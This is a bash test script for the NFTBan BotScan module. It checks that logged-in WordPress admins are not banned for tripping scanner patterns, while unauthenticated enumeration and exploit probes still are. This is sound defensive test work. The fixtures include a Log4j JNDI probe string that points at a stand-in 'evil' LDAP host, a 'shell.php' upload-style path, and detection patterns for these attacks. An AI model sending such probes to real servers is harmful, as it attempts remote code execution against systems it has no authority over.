#!/usr/bin/env bash
# =============================================================================
# NFTBan v1.192.2 - BotScan authenticated WP-admin false-positive context gate
# =============================================================================
# SPDX-License-Identifier: MPL-2.0
#
# meta:name="botscan_wpadmin_context_gate_v1922_test"
# meta:type="test"
# meta:version="1.192.2"
# meta:owner="Antonios Voulvoulis <contact@nftban.com>"
# meta:created_date="2026-06-17"
# meta:description="BOTSCAN_WP_AUTHENTICATED_ADMIN_FALSE_POSITIVE: a logged-in WP admin (POST /wp-login.php->302) is NOT banned for the WP REST/admin scanner patterns (EXP_WPREST/WS_WPADMIN) its editor legitimately trips, while unauthenticated enumeration, exploit routes, and no-auth scanners STILL ban. Per-IP CONTEXT gate, not a global pattern weakening. Drives process_entry + analyze directly; pattern path only (404/endpoint-flood disabled); public TEST-NET IPs (RFC1918 is auto-whitelisted)."
# meta:inventory.files="botscan_wpadmin_context_gate_v1922_test.sh"
# meta:inventory.binaries="bash,grep"
# meta:inventory.env_vars="NFTBAN_DATA_DIR,BOTSCAN_PATTERNS_DIR,BOTSCAN_BATCH_SIGNAL_MODE,BOTSCAN_WPADMIN_CONTEXT_GATE"
# meta:inventory.config_files=""
# meta:inventory.systemd_units=""
# meta:inventory.network=""
# meta:inventory.privileges=""
# meta:ta.id="botscan_wpadmin_context_gate_v1922_test"
# meta:ta.owner="botscan"
# meta:ta.module="botscan"
# meta:ta.execution_class="CI_HERMETIC_SHELL"
# meta:ta.gate="ci-bash"
# meta:ta.hermetic="true"
# meta:ta.requires_root="false"
# meta:ta.requires_network="false"
# meta:ta.requires_systemd="false"
# meta:ta.requires_nftables="false"
# meta:ta.requires_package="false"
# =============================================================================
set -Eeuo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NFTBAN_LIB_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
export NFTBAN_LIB_DIR
PASS=0; FAIL=0
ok(){ echo "  [PASS] $1"; PASS=$((PASS+1)); }
bad(){ echo "  [FAIL] $1"; FAIL=$((FAIL+1)); }

tmp="$(mktemp -d)"; trap 'rm -rf "$tmp"' EXIT
export NFTBAN_DATA_DIR="$tmp/data" BOTSCAN_PATTERNS_DIR="$tmp/patterns" NFTBAN_CONFIG_DIR="$tmp/noetc" \
       BOTSCAN_STATE_FILE="$tmp/state.db" BOTSCAN_LOG_FILE="$tmp/botscan.log" BOTSCAN_ENABLED=true \
       BOTSCAN_BATCH_SIGNAL_MODE=true BOTSCAN_404_THRESHOLD=999 BOTSCAN_ENDPOINT_FLOOD_ENABLED=false
mkdir -p "$NFTBAN_DATA_DIR/botguard" "$BOTSCAN_PATTERNS_DIR"
# Real WP patterns (mirror etc/nftban/patterns.d/botscan) + one exploit pattern.
{
  printf 'EXP_WPREST|/wp-json/wp/v2/users|url-get|5|300|1800|true|WP user enumeration\n'
  printf 'WS_WPADMIN|/wp-admin/.*\\.php.*\\.php|url-any|1|60|7200|true|WP double extension\n'
  printf 'CVE_LOG4J|jndi:|url-any|1|60|86400|true|Log4j RCE\n'
} > "$BOTSCAN_PATTERNS_DIR/test.patterns"

# shellcheck source=/dev/null
source "$NFTBAN_LIB_DIR/core/nftban_botscan.sh"
set +e   # driver tolerates non-zero rc from the lib calls; assertions read the signals file
nftban_botscan_load_config
nftban_botscan_load_patterns

SIG="$NFTBAN_DATA_DIR/botguard/batch_signals.jsonl"
pe(){ nftban_botscan_process_entry "$@" >/dev/null 2>&1 || true; }   # ip url method status ua
analyze(){ : > "$SIG"; nftban_botscan_analyze >/dev/null 2>&1 || true; }
banned(){ grep -q "\"ip\":\"$1\"" "$SIG" 2>/dev/null; }

# ---- one cycle, gate ENABLED, all cases (distinct public IPs) ----
export BOTSCAN_WPADMIN_CONTEXT_GATE=true
nftban_botscan_init_state
# A = AUTHENTICATED admin: successful login 302 + editor EXP_WPREST x5 + WS_WPADMIN x1
pe 198.51.100.1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
for _ in 1 2 3 4 5; do pe 198.51.100.1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
pe 198.51.100.1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
# B = UNAUTHENTICATED REST enumeration: EXP_WPREST x5, no login
for _ in 1 2 3 4 5; do pe 198.51.100.2 "/wp-json/wp/v2/users" GET 200 "python-requests/2.31"; done
# C = MIXED exploit: authenticated 302 + EXP_WPREST x5 + Log4j probe -> exploit must still ban
pe 198.51.100.3 "/wp-login.php" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
for _ in 1 2 3 4 5; do pe 198.51.100.3 "/wp-json/wp/v2/users" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
pe 198.51.100.3 "/?x=jndi:ldap://evil/a" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
# D = WS_WPADMIN (threshold 1) with NO auth -> must ban (stable UA never auto-exempts)
pe 198.51.100.4 "/wp-admin/load.php?x=shell.php" GET 404 "Mozilla/5.0 (Mac) Chrome/148"
# E = AUTHENTICATED admin, ONLY WS_WPADMIN -> suppressed -> no ban
pe 198.51.100.5 "/wp-login.php" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
pe 198.51.100.5 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
# F = normal editor admin-ajax 200 only (no scanner pattern) -> no ban trivially
pe 198.51.100.6 "/wp-admin/admin-ajax.php" POST 200 "Mozilla/5.0 (Mac) Chrome/148"
# G = empty-UA scanner doing EXP_WPREST x5, no auth -> bans
for _ in 1 2 3 4 5; do pe 198.51.100.7 "/wp-json/wp/v2/users" GET 200 "-"; done
# IPv4/IPv6 parity: the per-IP context gate keys on the source IP, so it must behave
# identically for IPv6 clients.
# H = IPv6 AUTHENTICATED admin: 302 login + EXP_WPREST x5 + WS_WPADMIN -> suppressed -> no ban
pe 2001:db8::1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
for _ in 1 2 3 4 5; do pe 2001:db8::1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
pe 2001:db8::1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
# I = IPv6 UNAUTHENTICATED WS_WPADMIN (threshold 1), no login -> must ban
pe 2001:db8::2 "/wp-admin/load.php?x=shell.php" GET 404 "Mozilla/5.0 (Mac) Chrome/148"
analyze

echo "=== gate ENABLED ==="
banned 198.51.100.1 && bad "A authenticated admin BANNED (FP not suppressed)" || ok "A authenticated WP admin NOT banned (EXP_WPREST+WS_WPADMIN suppressed)"
banned 198.51.100.2 && ok "B unauthenticated /wp-json enumeration STILL bans" || bad "B unauth enumeration not banned"
banned 198.51.100.3 && ok "C mixed exploit (admin+Log4j) STILL bans (exploit not suppressed)" || bad "C mixed exploit not banned"
banned 198.51.100.4 && ok "D WS_WPADMIN no-auth STILL bans (stable UA never auto-exempts)" || bad "D no-auth WS_WPADMIN not banned"
banned 198.51.100.5 && bad "E authenticated WS_WPADMIN-only BANNED" || ok "E authenticated admin (WS_WPADMIN only) NOT banned"
banned 198.51.100.6 && bad "F normal admin-ajax BANNED" || ok "F normal admin-ajax (no scanner pattern) NOT banned"
banned 198.51.100.7 && ok "G empty-UA scanner STILL bans" || bad "G empty-UA scanner not banned"
banned 2001:db8::1 && bad "H IPv6 authenticated admin BANNED (context gate not family-neutral)" || ok "H IPv6 authenticated admin NOT banned (gate suppresses for IPv6 too)"
banned 2001:db8::2 && ok "I IPv6 no-auth WS_WPADMIN STILL bans (enforcement family-neutral)" || bad "I IPv6 no-auth scanner not banned"

# ---- discriminator: gate DISABLED -> case A bans (proves the gate is what suppresses) ----
export BOTSCAN_WPADMIN_CONTEXT_GATE=false
nftban_botscan_init_state
pe 198.51.100.1 "/wp-login.php?redirect_to=/wp-admin/" POST 302 "Mozilla/5.0 (Mac) Chrome/148"
for _ in 1 2 3 4 5; do pe 198.51.100.1 "/wp-json/wp/v2/users/?who=authors" GET 200 "Mozilla/5.0 (Mac) Chrome/148"; done
pe 198.51.100.1 "/wp-admin/admin-ajax.php?f=skin.php" GET 200 "Mozilla/5.0 (Mac) Chrome/148"
analyze
echo "=== discriminator: gate DISABLED ==="
banned 198.51.100.1 && ok "A bans when gate disabled (pre-fix behavior reproduced — fixture discriminates)" || bad "A did not ban even with gate disabled"

echo ""
echo "=== botscan wp-admin context gate v1.192.2: PASS=$PASS FAIL=$FAIL ==="
[[ "$FAIL" -eq 0 ]] || exit 1
exit 0
